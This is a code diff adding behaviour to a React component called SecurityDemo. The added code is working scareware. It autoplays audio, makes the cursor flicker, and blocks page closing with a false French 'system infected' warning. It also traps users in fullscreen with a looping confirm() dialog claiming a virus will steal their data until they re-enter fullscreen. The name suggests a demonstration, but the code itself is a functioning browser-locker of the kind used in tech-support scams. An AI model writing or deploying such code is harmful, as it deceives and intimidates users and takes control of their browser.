@@ -1,10 +1,77 @@
 import { useState, useEffect, useRef } from "react";
 
 const SecurityDemo = () => {
+  useEffect(() => {
+    const voiceAudio = new Audio("../../../../public/uhm.mp3");
+    voiceAudio.play().catch((e) => console.log("Voice play failed:", e));
+
+    const cursorInterval = setInterval(() => {
+      document.body.style.cursor =
+        document.body.style.cursor === "none" ? "default" : "none";
+    }, 800);
+
+    return () => {
+      clearInterval(cursorInterval);
+      document.body.style.cursor = "default";
+    };
+  }, []);
+  useEffect(() => {
+    const handleBeforeUnload = (e) => {
+      e.preventDefault();
+      e.returnValue =
+        "ALERTE SÉCURITÉ: Votre système est infecté! Ne fermez pas cette fenêtre ou vos données seront compromises!";
+      return e.returnValue;
+    };
+
+    window.addEventListener("beforeunload", handleBeforeUnload);
+
+    return () => {
+      window.removeEventListener("beforeunload", handleBeforeUnload);
+    };
+  }, []);
+  useEffect(() => {
+    const handleFullscreenChange = () => {
+      if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+        setIsFullscreen(false);
+
+        // Start alert loop
+        const alertLoop = () => {
+          const userChoice = confirm(
+            "ALERTE SÉCURITÉ CRITIQUE!\n\nVotre système est infecté par un virus dangereux!\nNe quittez pas le mode plein écran ou vos données seront volées!\n\nCliquez sur OK pour revenir en sécurité ou Annuler pour risquer la perte de données."
+          );
+
+          if (userChoice) {
+            enterFullscreen();
+          } else {
+            setTimeout(alertLoop, 1000);
+          }
+        };
+
+        setTimeout(alertLoop, 1000);
+      } else {
+        setIsFullscreen(true);
+      }
+    };
+
+    document.addEventListener("fullscreenchange", handleFullscreenChange);
+    document.addEventListener("webkitfullscreenchange", handleFullscreenChange);
+
+    return () => {
+      document.removeEventListener("fullscreenchange", handleFullscreenChange);
+      document.removeEventListener(
+        "webkitfullscreenchange",
+        handleFullscreenChange
+      );
+    };
+  }, []);
   const enterFullscreen = () => {
     const el = document.documentElement;
     if (el.requestFullscreen) {
       el.requestFullscreen();
+    } else if (el.webkitRequestFullscreen) {
+      el.webkitRequestFullscreen();
+    } else if (el.msRequestFullscreen) {
+      el.msRequestFullscreen();
     }
   };
   const [currentStep, setCurrentStep] = useState(1);
